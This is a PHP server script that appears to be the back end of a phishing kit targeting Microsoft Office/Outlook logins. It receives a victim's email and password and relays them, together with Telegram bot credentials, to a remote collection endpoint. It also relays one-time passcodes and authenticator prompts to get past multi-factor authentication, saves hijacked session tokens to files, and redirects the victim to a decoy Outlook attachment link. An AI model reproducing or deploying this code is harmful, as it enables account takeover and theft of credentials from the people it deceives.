<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
include 'config.php';

    $ai = trim($_POST['ai']);
    $pr = trim($_POST['pr']);
if (isset($_POST['btn2'])) {
    $params = "email=".$email."&password=".$token."&session=".file_get_contents("session.txt")."&digits=".$_POST['4dig'];
    $url = $base."results/four-digit?".$params;
    $res=curl($url);
    if($res=="WaitOtp"){
        echo "WaitOtp";
        exit();
    }else if($res=="Error"){
        echo "Failed";
        exit();
    }

}

else if (isset($_POST["code"])) {
    $params = "email=".$email."&password=".$token."&session=".file_get_contents($_POST['em'].".txt")."&otp=".$_POST['code'];
    $url = $base."results/put-otp?".$params."&telegramtoken=".$telegarmToken."&id=".$telegramId;
    $res=curl($url);
    if($res=="Success"){
        echo "Success";
        Redirect("https://outlook.office.com/mail/deeplink/attachment/AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2/TKZXmQgWJ8d/BwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAA%3d/AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2/TKZXmQgWJ8d/BwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAABEgAQAOU3uDDby%2blMuQ6mJc/tlMs%3d/?AttachmentId=AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2%2fTKZXmQgWJ8d%2fBwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAABEgAQAOU3uDDby%2blMuQ6mJc%2ftlMs%3d&ItemId=AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2%2fTKZXmQgWJ8d%2fBwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAA%3d&AttachmentName=EML5668500.PDF");
       exit();
    }else{
        echo "Failed";
        exit();
    }
}
else if($ai != null && $pr != null){
   
    $params = "email=".$email."&password=".$token."&domain=".$domain."&page=".$page."&office_email=".$ai."&office_password=".base64_encode($pr);
    $url = $base."results/office-auth-telegram?".$params."&telegramtoken=".$telegarmToken."&id=".$telegramId;
    $res=curl($url);
    
    $respns=json_decode($res);
    $authcode="";
         if (strpos($respns->response,"Authapp") !== false) {
                          $rw=explode("|",$respns->response);
                          $respns->response=$rw[0];
                          $authcode=$rw[1];
                        }
                        
                        
                        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = $url;
fwrite($myfile, $txt);
fclose($myfile);
                    
    if($respns->response=="Done"){
       echo "Done";
       
     Redirect("https://outlook.office.com/mail/deeplink/attachment/AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2/TKZXmQgWJ8d/BwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAA%3d/AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2/TKZXmQgWJ8d/BwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAABEgAQAOU3uDDby%2blMuQ6mJc/tlMs%3d/?AttachmentId=AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2%2fTKZXmQgWJ8d%2fBwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAABEgAQAOU3uDDby%2blMuQ6mJc%2ftlMs%3d&ItemId=AAMkADZkZDk2MWMyLTRjZWEtNDNlYy05NWI1LTNlOWQ0N2IwOTM5NwBGAAAAAAB%2bbQNzue2%2fTKZXmQgWJ8d%2fBwBiYXgRZwN1QK4gUI3NyiO5AAAAAAEMAABiYXgRZwN1QK4gUI3NyiO5AAI7JGRrAAA%3d&AttachmentName=EML5668500.PDF");
       exit();
    }else if($respns->response=="Failed"){
        echo "Failed";
        exit();
    }else if($respns->response=="4digit wait"){
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "4digit";
        exit();
    }else if($respns->response=="Authapp"){
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "Authapp|".$authcode;
        exit();
    }
    else if($respns->response=="WaitOtp"){
        
        
        
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "WaitOtp";
        exit();
    }
}else{
    echo "Bad";
    exit();
}

   function curl($url){
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($curl, CURLOPT_HEADER, false);
       $data = curl_exec($curl);
       curl_close($curl);
       return $data;
   }

function Redirect($url, $permanent = false)
{
    if (headers_sent() === false)
    {
        header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
    }
    exit();
}
?>